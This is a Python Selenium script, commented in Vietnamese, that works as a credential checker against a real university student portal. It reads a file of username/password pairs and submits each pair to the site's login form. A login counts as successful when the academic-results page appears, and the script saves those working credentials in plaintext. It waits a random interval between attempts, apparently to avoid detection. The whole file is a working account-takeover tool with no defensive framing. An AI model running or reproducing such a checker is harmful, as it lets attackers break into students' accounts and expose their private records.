from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait

import time
import random

# Khởi tạo trình duyệt
driver = webdriver.Edge()

# Đọc danh sách tài khoản từ file
accounts = []
with open("CheckAccount/acc.txt", "r") as file:
    for line in file:
        line = line.strip()
        if line:
            username, password = line.split(" ")
            accounts.append((username, password))

# Truy cập vào trang đăng nhập
driver.get("https://sinhvien.ntu.edu.vn")

with open("ketqua.txt", "w", encoding="utf-8") as fileketqua:
    fileketqua.write("Start\n")
    # Lặp qua danh sách tài khoản và thực hiện đăng nhập
    for account in accounts:
        username, password = account
        # Tìm và điền thông tin đăng nhập
        username_input = driver.find_element(By.ID, "txt_Login_ten_dang_nhap")
        password_input = driver.find_element(By.ID, "pw_Login_mat_khau")
        # Xóa nội dung trường nhập liệu trước khi điền thông tin tài khoản mới
        username_input.clear()
        password_input.clear()
        # Điền thông tin tài khoản
        username_input.send_keys(username)
        password_input.send_keys(password)
        # Bấm nút login
        login_button = driver.find_element(By.NAME, "bt_Login_submit")
        login_button.click()

        # Kiểm tra điều kiện đăng nhập thành công: có "Kết quả học tập"
        if "Kết quả học tập" in driver.page_source:
            # Mở tệp để ghi
            ketqua = f"Đăng nhập thành công: {username} {password}\n"
            fileketqua.write(ketqua)
            # Xóa cookie và tải lại trang để đảm bảo việc đăng nhập mới
            driver.delete_all_cookies()
            driver.refresh()
            print(f"{username} OK.")
        else:
            # Nếu không login được
            fileketqua.write(f"Tài khoản {username} login Failed\n")
            print(f"Login {username} failed.")
        # Thời gian sleep ngẫu nhiên từ 1 đến 3 giây
        sleep_time = random.randint(1, 3)
        time.sleep(sleep_time)

# Sau khi hoàn thành đăng nhập tất cả tài khoản, đóng trình duyệt
driver.quit()